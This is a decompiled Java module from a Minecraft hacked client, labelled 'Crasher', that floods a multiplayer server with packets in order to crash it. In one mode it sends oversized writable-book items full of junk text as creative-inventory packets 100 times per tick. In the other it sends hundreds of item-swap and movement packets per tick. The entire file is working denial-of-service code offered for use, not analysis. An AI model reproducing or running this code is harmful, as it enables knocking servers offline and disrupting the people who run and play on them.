//Deobfuscated with https://github.com/PetoPetko/Minecraft-Deobfuscator3000 using mappings "1.12 stable mappings"!

// 
// Decompiled by Procyon v0.5.36
// 

package me.gopro336.goprohack.modules.exploit;

import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.BlockPos;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;
import java.util.function.Predicate;
import me.gopro336.goprohack.events.client.EventClientTick;
import me.zero.alpine.fork.listener.EventHandler;
import net.minecraftforge.event.entity.EntityJoinWorldEvent;
import me.zero.alpine.fork.listener.Listener;
import me.gopro336.goprohack.modules.Value;
import me.gopro336.goprohack.modules.Module;

public final class CrashExploitModule extends Module
{
    public final Value<Modes> Mode;
    @EventHandler
    private Listener<EntityJoinWorldEvent> OnWorldEvent;
    @EventHandler
    private Listener<EventClientTick> OnTick;
    
    public CrashExploitModule() {
        super("Crasher", new String[] { "CrashExploit" }, "Attemps to crash servers", "NONE", 5131167, ModuleType.EXPLOIT);
        this.Mode = new Value<Modes>("Mode", new String[] { "M" }, "Mode of method for server crash", Modes.Book);
        this.OnWorldEvent = new Listener<EntityJoinWorldEvent>(p_Event -> {
            if (p_Event.getEntity() == this.mc.player) {
                this.toggle();
            }
            return;
        }, (Predicate<EntityJoinWorldEvent>[])new Predicate[0]);
        final ItemStack book;
        final NBTTagList list;
        final NBTTagCompound tag;
        final String size;
        int i;
        String siteContent;
        NBTTagString tString;
        int j;
        int k;
        this.OnTick = new Listener<EventClientTick>(p_Event -> {
            switch (this.Mode.getValue()) {
                case Book: {
                    book = new ItemStack(Items.WRITABLE_BOOK);
                    list = new NBTTagList();
                    tag = new NBTTagCompound();
                    size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                    for (i = 0; i < 50; ++i) {
                        siteContent = size;
                        tString = new NBTTagString(siteContent);
                        list.appendTag((NBTBase)tString);
                    }
                    tag.setString("author", "Robearttt");
                    tag.setString("title", "Hause unban me");
                    tag.setTag("pages", (NBTBase)list);
                    book.setTagInfo("pages", (NBTBase)list);
                    book.setTagCompound(tag);
                    for (j = 0; j < 100; ++j) {
                        try {
                            this.mc.getConnection().sendPacket((Packet)new CPacketCreativeInventoryAction(0, book));
                        }
                        catch (Exception ex) {}
                    }
                    break;
                }
                case Offhand: {
                    for (k = 0; k < 420; ++k) {
                        this.mc.player.connection.sendPacket((Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, EnumFacing.UP));
                        this.mc.player.connection.sendPacket((Packet)new CPacketPlayer(true));
                    }
                    break;
                }
            }
        }, (Predicate<EventClientTick>[])new Predicate[0]);
    }
    
    public enum Modes
    {
        Book, 
        Offhand;
    }
}
